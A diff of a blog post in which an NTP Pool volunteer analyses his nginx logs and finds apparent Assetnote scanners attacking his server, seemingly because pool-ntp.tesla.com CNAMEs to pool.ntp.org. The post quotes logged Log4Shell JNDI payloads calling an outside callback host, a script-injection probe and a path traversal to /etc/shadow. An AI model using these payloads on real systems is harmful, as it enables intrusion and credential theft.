@@ -14,7 +14,7 @@ ntpuserinfo  html=ntpuserinfo.html gemini=ntpuserinfo.gmi gemini.col=25 gopher=n
 
 @end
 
-It’s not unusual for everything on the dark dungeons of the IPv4 Internet to be subject to a barrage of drive-by scanner traffic and the occasional bizarrely persistent attacker, I noticed something strange while looking through my nginx logs. Persistent attack traffic coming from three particular IPs, with the strange thing being that they were arriving with `Host` or `Referer` headers from `pool-ntp.tesla.com`, carried Assetnote user agents, and were trying to SSRF me to Assetnote callback URLs:
+Whilet’s not unusual for everything on the dark dungeons of the IPv4 Internet to be subject to a barrage of drive-by scanner traffic and the occasional bizarrely persistent attacker, I noticed something strange while looking through my nginx logs. Persistent attack traffic coming from three particular IPs, with the strange thing being that they were arriving with `Host` or `Referer` headers from `pool-ntp.tesla.com`, carried Assetnote user agents, and were trying to SSRF me to Assetnote callback URLs:
 
 ```
 35.168.63.24 - - [13/Sep/2026:01:14:31 -0700] "GET /?a=%3Cscript%20src=${jndi${:-:}ldap${:-:}//waf6.${date:MM-dd-yyyy}.pool-ntp.tesla.com.log4j.assetnote-callback.com/}>alert()%3C%2Fscript%3E HTTP/1.1" 299 817 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 ${jndi${:-:}ldap${:-:}//waf6.${date:MM-dd-yyyy}.pool-ntp.tesla.com.log4j.assetnote-callback.com/}" host=pool-ntp.tesla.com
@@ -22,11 +22,11 @@ It’s not unusual for everything on the dark dungeons of the IPv4 Internet to b
 
 The traffic came from three specific scanners: `54.165.75.96`, `35.168.63.24`, and `52.44.200.251`. All of those are in the Amazon Web Services AS (AMAZON-AES).
 
-Assetnote, a legitimate attack surface management now called Searchlight Cyber in marketing materials, does indeed use continuous threat exposure scanners like this to perform automated checks for customers’ assets. Assuming this is actual Assetnote traffic (they do indeed use AWS, so that checks out), they must be mistaking me for an internal Tesla asset.
+Assetnote, a legitimate attack surface management tool now called Searchlight Cyber in marketing materials, does indeed use continuous threat exposure scanners like this to perform automated checks for customers’ assets. Assuming this is actual Assetnote traffic (they do indeed use AWS, so that checks out), they must be mistaking me for an internal Tesla asset.
 
 ## How this happened
 
-Tesla publishes `pool-ntp.tesla.com` as a CNAME to `pool.ntp.org`. `pool.ntp.org` is the [NTP Pool](@ntppoolorg), a round‐robin of volunteer DNS servers that [I’m a part of](@ntpuserinfo). 
+Tesla publishes `pool-ntp.tesla.com` as a CNAME to `pool.ntp.org`. `pool.ntp.org` is the [NTP Pool](@ntppoolorg), a round‐robin of volunteer NTP servers that [I’m a part of](@ntpuserinfo). 
 
 Speculation: Assetnote pulled in everything it could find under `tesla.com`, including `pool-ntp.tesla.com`, which CNAMEs to `pool.ntp.org`, which can resolve to my machine — `67.215.249.229`. The asset inventory saves this as a Tesla asset, and starts throwing exploits at me, a stranger.
 
@@ -53,7 +53,7 @@ dreamstation.systems / 67.215.249.229
 
 They tried all kinds of exploits against me: path traversal, webshell uploads, probing software internals, probing WordPress and other CMS management endpoints, SSRF, Log4Shell, and a lot more.
 
-There was also callback attempts. 989 requests embedded assetnote-callback.com hostnames for log4shell and text4shell detection, and 114 named canary.assetnotessrf.com for SSRF:
+There were also callback attempts. 989 requests embedded `assetnote-callback.com` hostnames for Log4Shell and Text4Shell detection, and 114 named `canary.assetnotessrf.com` for SSRF:
 
 ```
 GET /solr/admin/collections?action=${jndi:ldap://solr.${hostName}.${date:MM-dd-yyyy}.pool-ntp.tesla.com.log4j.assetnote-callback.com/a}
@@ -61,7 +61,7 @@ GET /solr/admin/collections?action=${jndi:ldap://solr.${hostName}.${date:MM-dd-y
 
 Something funny that I don’t have an explanation for is that fifteen requests carried a Host header `login.solarcity.com`, all requesting `GET /(S(x))/b/(S(x))in/System.Web.Mvc.dll`, which I think is some sort of ASP.NET trick trying to resolve `/b/(S(x))in/` to `/bin/`.
 
-I found some other amusing information outside of the Host header. Sweeping the Referer headers, URLs and query strings turns up hostnames baked into the templates themselves, like this:
+I found some other amusing information outside of the `Host` header. Sweeping the Referer headers, URLs, and query strings turns up hostnames baked into the templates themselves, like this:
 
 ```
 GET /calendars/admin@lowlevelaccess.jlg.com/calendar/../../../mail/lowlevelaccess.jlg.com/admin/.x-attachment-1-y/new/../../../../../../../../../etc/shadow
@@ -69,7 +69,7 @@ GET /calendars/admin@lowlevelaccess.jlg.com/calendar/../../../mail/lowlevelacces
 
 Other third‐party hostnames I noticed included `servicemcdonalds.com`, `saferas.com`, `rsmafghanistan.af`, `enrichcs.com.au`, `escience2010.org`, `al-forno.com.au`, and `disneyfineart.com`. 
 
-A RFC 1918 address also appears in the Referer of one probe:
+An RFC 1918 address also appears in the Referer of one probe:
 
 ```
 GET /internal/v2/config/mps_secret/ADM_SESSIONID
@@ -120,4 +120,4 @@ $ sudo rg -zFI pool-ntp.tesla.com access.log* | awk '{print $1}' | sort | uniq -
       2 54.202.10.40
 ```
 
-but nobody else has said anything. I am wondering if they are re‐resolving `pool-ntp.tesla.com` every single time and hitting everything GeoIP will let them reach, or if they just collected a few pool IPs and are only hammering those.
+but nobody else has said anything. I am wondering if they are re‐resolving `pool-ntp.tesla.com` every single time and hitting everything the geolocation magic will let them reach, or if they just collected a few pool IPs and are only hammering those.
